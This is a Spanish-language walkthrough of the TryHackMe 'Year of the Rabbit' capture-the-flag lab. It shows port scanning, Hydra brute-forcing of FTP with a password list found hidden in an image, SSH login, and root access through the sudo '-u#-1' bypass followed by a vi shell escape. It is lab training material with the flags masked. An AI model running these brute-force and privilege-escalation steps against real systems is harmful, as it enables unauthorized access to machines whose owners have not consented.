---
title : MQ|Rabbit|THM|FTP|BRAINFUCK|LXD
published : True
---

<div class="contenedor imgc">
    <img class="imgc" src="/imgs/Rabbit/Rabbit0.png" style="border-radius: 150px; width: 169px" alt="Calamity log">
    <div> 
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Dificultad: facil </p>
        <p><font color="red" style="text-shadow: 5px 5px 20px red;">#</font> Url: <a href="https://tryhackme.com/r/room/yearoftherabbit" style="color: lightblue;">Rabbit</a></p>
    </div>
</div>

<h2><font color="white"><center># Rabbit</center></font></h2>

* Empezamos lanzando un ping a la maquina para observar la trazabilidad de conexión y enumerar por su ttl el sistema operativo, que en este caso es una maquina Linux.


```java
# ping -c1 10.10.37.210 -R
PING 10.10.37.210 (10.10.37.210) 56(124) bytes of data.
64 bytes from 10.10.37.210: icmp_seq=1 ttl=60 time=395 ms
RR: 	10.17.21.18
	10.16.107.119
	10.10.37.210
	10.10.37.210
	10.17.0.1
	10.17.21.18


--- 10.10.37.210 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 395.106/395.106/395.106/0.000 ms
```

* Ahora procedemos a enumerar puertos abiertos en el servidor.

```java
# Nmap 7.94SVN scan initiated Wed Dec 18 18:04:25 2024 as: nmap --min-rate 5000 -sS -Pn -A -sCV --open -v -p- -oN allServices 10.10.63.99
Nmap scan report for 10.10.63.99
Host is up (0.39s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
21/tcp open  ftp     vsftpd 3.0.2
22/tcp open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
| ssh-hostkey: 
|   1024 a0:8b:6b:78:09:39:03:32:ea:52:4c:20:3e:82:ad:60 (DSA)
|   2048 df:25:d0:47:1f:37:d9:18:81:87:38:76:30:92:65:1f (RSA)
|   256 be:9f:4f:01:4a:44:c8:ad:f5:03:cb:00:ac:8f:49:44 (ECDSA)
|_  256 db:b1:c1:b9:cd:8c:9d:60:4f:f1:98:e2:99:fe:08:03 (ED25519)
80/tcp open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.10 (Debian)
| http-methods: 
|_  Supported Methods: OPTIONS GET HEAD POST
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94SVN%E=4%D=12/18%OT=21%CT=1%CU=38366%PV=Y%DS=5%DC=T%G=Y%TM=676
OS:35534%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8
OS:)SEQ(SP=107%GCD=1%ISR=109%TI=Z%CI=I%II=I%TS=8)OPS(O1=M508ST11NW6%O2=M508
OS:ST11NW6%O3=M508NNT11NW6%O4=M508ST11NW6%O5=M508ST11NW6%O6=M508ST11)WIN(W1
OS:=68DF%W2=68DF%W3=68DF%W4=68DF%W5=68DF%W6=68DF)ECN(R=Y%DF=Y%T=40%W=6903%O
OS:=M508NNSNW6%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N
OS:)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=
OS:S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF
OS:=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=0%RIPL=
OS:G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Uptime guess: 197.262 days (since Tue Jun  4 11:47:32 2024)
Network Distance: 5 hops
TCP Sequence Prediction: Difficulty=262 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   270.08 ms 10.17.0.1
2   ... 4
5   394.40 ms 10.10.63.99

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Wed Dec 18 18:05:24 2024 -- 1 IP address (1 host up) scanned in 58.80 seconds
```
<center>
80http | 21ftp | 22ssh.
</center>

* Procedemos a ver el puerto http 80 que corre el servidor.

<img src="imgs/Rabbit/Rabbit1.png">

* Si observamos el código fuente de la pagina agrega una hoja de estilo cuando por lo normal esta es independiente.

<img src="imgs/Rabbit/Rabbit2.png">

* Y vemos que nos da un supuesto mensaje secreto.

<img src="imgs/Rabbit/Rabbit3.png">

* Cuando realizamos la petición a sup3r_s3cr3t_fl4g.php nos aparece un mensaje en el que se advierte desactivar java script.

<img src="imgs/Rabbit/Rabbit4.png">

* Puede desactivar el java script en about:config - javascript - false, lo único que vera sera la canción y un corto mensaje a mitad de la canción nada relevante, Procedemos a usar BurSuite para ver peticiones de la pagina en uso, al estar dando forward por un rato veo que la pagina redirige a un directorio.

<img src="imgs/Rabbit/Rabbit5.png">

* Vemos que hay dentro del directorio encontrado solo hay una imagen.

<img src="imgs/Rabbit/Rabbit6.png">

* Procedemos a descargar la imagen y vemos que hay un mensaje oculto, donde nos mencionan un usuario y mas abajo un listado de credenciales posibles para este usuario.

```java
# sed -n '1790, 1791p' Hot_Babe.png
Eh, you've earned this. Username for FTP is ftpuser
One of these is the password:
```

* Guardamos las credenciales en un wordlists.txt y usamos hydra para obtener la credencial del usuario.

```java
# sed -n '1792, $p' Hot_Babe.png > wordlists.txt
# hydra -l ftpuser -P wordlists.txt 10.10.37.210 ftp
Hydra v9.4 (c) 2022 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2024-12-18 23:23:00
[DATA] max 16 tasks per 1 server, overall 16 tasks, 82 login tries (l:1/p:82), ~6 tries per task
[DATA] attacking ftp://10.10.37.210:21/
[21][ftp] host: 10.10.37.210   login: ftpuser   password: ###########
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2024-12-18 23:23:18
```

* Nos conectamos por fpt y descargamos el archivo encontrado.

```java
# ftp ftpuser@10.10.37.210
Connected to 10.10.37.210.
220 (vsFTPd 3.0.2)
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls -al
229 Entering Extended Passive Mode (|||21640|).
150 Here comes the directory listing.
drwxr-xr-x    2 0        0            4096 Jan 23  2020 .
drwxr-xr-x    2 0        0            4096 Jan 23  2020 ..
-rw-r--r--    1 0        0             758 Jan 23  2020 Eli's_Creds.txt
226 Directory send OK.
ftp> get Eli's_Creds.txt
local: Eli's_Creds.txt remote: Eli's_Creds.txt
229 Entering Extended Passive Mode (|||32835|).
150 Opening BINARY mode data connection for Eli's_Creds.txt (758 bytes).
100% |*****************************************************************************************************************************|   758       10.62 MiB/s    00:00 ETA
226 Transfer complete.
758 bytes received in 00:00 (1.88 KiB/s)
ftp> exit
221 Goodbye
```
* Vemos el archivo descargado cifrado en Brainfuck.

<img src="imgs/Rabbit/Rabbit7.png">

* Decodificamos el código,y nos da un usuario con credencial.

<img src="imgs/Rabbit/Rabbit8.png">

* Nos conectamos por ssh. y observamos un mensaje de root.

```java
# ssh eli@10.10.37.210
The authenticity of host '10.10.37.210 (10.10.37.210)' can't be established.
ED25519 key fingerprint is SHA256:va5tHoOroEmHPZGWQySirwjIb9lGquhnIA1Q0AY/Wrw.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.37.210' (ED25519) to the list of known hosts.
eli@10.10.37.210's password: 

1 new message
Message from Root to Gwendoline:

"Gwendoline, I am not happy with you. Check our leet s3cr3t hiding place. I've left you a hidden message there"

END MESSAGE
```

* El mensaje nos habla de algo oculto llamado s3cr3t procedemos a buscar.

```java
eli@year-of-the-rabbit:~$ find / -name s3cr3t 2>/dev/null
/usr/games/s3cr3t

eli@year-of-the-rabbit:~$ cd /usr/games/s3cr3t/

eli@year-of-the-rabbit:/usr/games/s3cr3t$ ls -all
total 12
drwxr-xr-x 2 root root 4096 Jan 23  2020 .
drwxr-xr-x 3 root root 4096 Jan 23  2020 ..
-rw-r--r-- 1 root root  138 Jan 23  2020 .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly!
```

* Leemos el archivo y nos da una credencial 

```java
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat .th1s_m3ss4ag3_15_f0r_gw3nd0l1n3_0nly\! 
Your password is awful, Gwendoline. 
It should be at least 60 characters long! Not just ###########
Honestly!

Yours sincerely
   -Root
eli@year-of-the-rabbit:/usr/games/s3cr3t$ 
```

* Verificamos usuario en el sistema.

```java
eli@year-of-the-rabbit:/usr/games/s3cr3t$ cat /etc/passwd | grep 'sh$'

root:x:0:0:root:/root:/bin/bash
speech-dispatcher:x:114:29:Speech Dispatcher,,,:/var/run/speech-dispatcher:/bin/sh
eli:x:1000:1000:eli,,,:/home/eli:/bin/bash
gwendoline:x:1001:1001:,,,:/home/gwendoline:/bin/bash
```

* Nos convertimos en gwendoline con la credencial encontrada, y vemos que podemos correr el comando vi como root.

```java
eli@year-of-the-rabbit:/usr/games/s3cr3t$ su gwendoline
Password: 

gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -l

Matching Defaults entries for gwendoline on year-of-the-rabbit:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User gwendoline may run the following commands on year-of-the-rabbit:
    (ALL, !root) NOPASSWD: /usr/bin/vi /home/gwendoline/user.txt
``` 

* Corremos el comando como sudo, pero con el UID -1 para indicar que hacer referencia a 0, ya que si colocamos de una vez el 0 no nos dejara. 

```java
gwendoline@year-of-the-rabbit:/usr/games/s3cr3t$ sudo -u#-1 /usr/bin/vi /home/gwendoline/user.txt
```

* Colocamos en nuestro teclado los dos puntos y escribimos :!/bin/bash para obtener una shell como root.

```java
:!/bin/bash
```

* De esta forma obtenemos una shell como root y podemos observar la flag de root.txt y de user.txt.

```java
root@year-of-the-rabbit:/root# whoami
root

root@year-of-the-rabbit:/root# cat /root/root.txt 
THM{########}

root@year-of-the-rabbit:/root# cat /home/gwendoline/user.txt 
THM{########}
```